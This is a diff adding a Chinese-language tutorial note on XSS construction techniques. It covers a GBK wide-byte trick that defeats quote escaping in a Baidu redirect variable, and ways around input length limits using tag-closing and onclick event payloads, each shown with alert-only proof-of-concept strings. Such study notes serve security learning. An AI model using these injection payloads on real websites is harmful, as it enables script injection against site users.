@@ -1,0 +1,62 @@
+# XSS构造技巧
+
+## 0x01利用字符编码
+
+百度在一个<script>标签中输出了一个变量，并转义了双引号：
+
+```
+var redirectUrl="\";alert(/XSS/);";
+```
+
+因为第二个双引号被转义符转义，所以alert在引号内成为变量。
+
+但是，百度返回界面是GBK/GB2312编码，因此%c1\可以组成一个Unicode字符。所以构造：
+
+```
+%c1";alert(/XSS/);
+```
+
+百度返回：
+
+```
+var redirectUrl="%c1\";alert(/XSS/);";
+```
+
+转义符失效，双引号闭合。XSS攻击成功。
+
+## 0x02绕过长度限制
+
+举例说明：
+
+```
+<input type=text value="$var" />
+```
+
+服务器端如果没有对变量"$var"做长度限制，我们可以构造"$var"为：
+
+```
+"><script>alert(/XSS/)</script>
+```
+
+得到的效果为：
+
+```
+<input type=text value=""><script>alert(/XSS/)</script>" />
+```
+
+如果长度限制长度为20，那么得到的结果为：
+
+```
+<input type=text value=""><script>alert(/XSS
+```
+
+完整的payload无法构造，攻击失败。
+
+这时，可以尝试用其他方式进行攻击，比如：事件（event）：
+
+```
+$var为 : "onclick=alert(1)
+```
+
+可以看出事件缩短的长度是有限的。
+
